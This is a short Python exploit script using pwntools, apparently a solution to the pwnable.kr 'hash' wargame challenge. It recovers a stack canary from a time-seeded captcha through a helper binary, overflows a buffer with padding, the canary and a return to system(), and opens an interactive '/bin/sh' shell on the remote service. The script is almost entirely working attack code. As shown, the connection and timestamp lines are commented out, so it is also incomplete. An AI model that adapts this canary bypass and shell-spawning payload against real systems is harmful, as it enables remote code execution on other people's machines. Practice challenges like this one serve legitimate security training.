#!/usr/bin/env python
# coding: utf-8

import os
import re
import time
import random
import urllib2

from pwn import *

# elf = ELF('./hash')
# plt_system = elf.plt['system']
plt_system = 0x08048880

# Local EXP
# t = int(time.time())
# p = process('./hash')

# Remote EXP
# date = urllib2.urlopen('http://pwnable.kr').headers['Date']
# t = int(time.mktime(time.strptime(date, '%a, %d %b %Y  %H:%M:%S %Z')))
# t += random.randint(0, 3)
# p = remote('pwnable.kr', 9002)

capcha = re.search(r'(-?[\d]+)', p.recvline_regex(r'(-?[\d]{5,})')).group(0)
p.sendline(capcha)

canary = '0x' + os.popen('./getcanary {} {}'.format(str(t), capcha)).read()
canary = int(canary, 16)

# Input string is in .bss [0x0804B0E0], write "/bin/sh" padding to the input buffer string
payload = 'A' * 512 + p32(canary) + 'A' * 12 + p32(plt_system) + p32(0x8048a00) + p32(0x0804B0E0 + 540*4/3)

p.sendline(b64e(payload) + '/bin/sh\0')
p.interactive()
